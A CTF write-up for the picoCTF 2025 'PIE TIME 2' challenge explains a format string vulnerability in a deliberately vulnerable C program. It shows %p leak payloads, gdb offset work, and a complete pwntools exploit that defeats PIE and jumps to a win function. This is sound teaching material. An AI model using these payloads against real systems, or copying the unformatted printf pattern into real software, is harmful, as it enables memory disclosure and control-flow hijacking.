## picoCTF 2025 PIE TIME binary exploitation challenge

A deep-dive into a `medium` categorized binary exploitation challenge of picoCTF 2025 CTF. Defining what format string vulnerabilities are, and explaining how to exploit them to leak memory addresses.

## Reconnaissance

We need to define what `architecture` is the executable file is compiled for, and we need to identify what protections are enabled. To do this, we can use these two linux commands that help us do this:

```bash
file vuln
```

```bash
checksec --file=vuln
```

And we will get the result below:
![Result of running the commands above.](images/pie-time-2/recon.png)

The result tells us that the program is compiled for `64-bit architecture`, and has the `FULL RELRO`, `NX`, `Canary` and `PIE` protections enabled. This means that we cannot perform buffer overflows to execute our preferred code, and in case we want to use ROP chain, we need to leak the canary address. Finally `PIE` means that the binary executable and its dependencies load into a random, non-fixed location in memory each time it is run.

## Vulnerability Analysis

```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
    // win function code
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

Starting with `main` function, which has nothing to deal with only that it calls `call_functions` function. Lets try to break down what this function does:

1. Creates an array of type `char`, with size of `64`.
2. Simple print function that prints: `Enter your name:`.
3. Takes user input, and stores **only** 64 characters in the array. This means that we don't have a **buffer overflow** vulnerability here, so we should start searching for other types of vulnerabilities.
4. Print function that directly prints content of the `buffer` array without formatting. Wait! without formatting?!
   No formatting means we **can** use format specifiers (such as %s, %p, etc...) and `printf` function will treat them as instructions not as a string! Lets keep this in mind and continue reading code.
5. Creates unsigned `long` type variable.
6. Asks user to enter an address, that then will be converted into a function, and this function will be called, this means any address we enter the program will jump to it. If you said here we will enter win address, then you are right!
   But how we can get the win function address if we don't know any address related to this program to extract base address, then finally get win function address?

## Exploitation Strategy

We identified a **format string vulnerability**, so our strategy is to exploit it to leak any address to extract the base address from it.

### Phase 1

The goal of this phase is to find the fixed offset of an address we leak internally, then use it to find base address after we leak it remotely.

1. Run `gdb ./vuln` to use gdb tools on the binary executable file.
2. Run the `run` command.
3. In the first input, enter the following payload, then hit `Ctrl + C`:

```
%p.%p.%p.%p.%p.%p.%p.%p.%p
```

![Leaking addresses internally.](images/pie-time-2/leak_internal.png)
Save these addresses to compare them with the program addresses range then. 

4. run `info proc map` to see live memory mapping of the process.
![live memory mapping.](images/pie-time-2/info_proc_map.png)
**Analyzing memory**: Looking at first 5 lines, this gives us information about the range of the program related addresses, which is **0x0000555555554000 - 0x0000555555559000**.

Looking at addresses that we got from our payload, there is no address in this range! Lets dive more in memory sending this payload:
```
%15$p.%16$p.%17$p.%18$p.%19$p.%20$p
```
**Note**: you need to run `quit` command and re run `gdb ./vuln` to restart program, or simply run `./vuln` in another terminal tab.
![Leaking related address.](images/pie-time-2/leak_internal2.png)

Look! address number 19 contains an address that is related to program!
5. Extract fixed offset:
```c
offset = 0x555555555441 - 0x0000555555554000 = 0x1441
```
6. Find win function offset:
```bash
objdump -M intel -d vuln | grep win
```
![Leaking related address.](images/pie-time-2/win_offset.png)
**win_offset** = 0x136a

7. Run `nc` to access the server and enter the payload (`%19$p`):
```bash
nc rescued-float.picoctf.net 54593
```
![Leaking address remotely.](images/pie-time-2/remote_leak.png)
```c
base_address = 0x64c18f438441 - 0x1441 = 0x64c18f437000
```
```c
win_function_address = 0x64c18f437000 + 0x136a = 0x64c18f43836a
```
8. Enter win function address to jump to the win function:
![Flag.](images/pie-time-2/flag.png)
## Exploit

Exploitation can be automated using python `pwn` library:

```python
from pwn import *

p = remote("IP/DOMAIN", PORT)
#p = process("./vuln") # Alternative if you want to run solution locally

win_offset = 0x136a
offset = 0x1441

payload1 = b"%19$p"

p.recvuntil(b"Enter your name:")

print("[+] Sending payload: %19$p\n")
p.sendline(payload1)

# Leak address to extract base address
address = int(p.recvline().strip(), 16)
print(f"[+] received address: {hex(address)}")

base_addr = address - offset
print(f"[+] Extracted base address: {hex(base_addr)}")
win_addr = base_addr + win_offset

p.recvuntil(b"0x12345: ")

payload2 = str(hex(win_addr)).encode()
p.sendline(payload2)

# Print flag
print(p.recvall())

```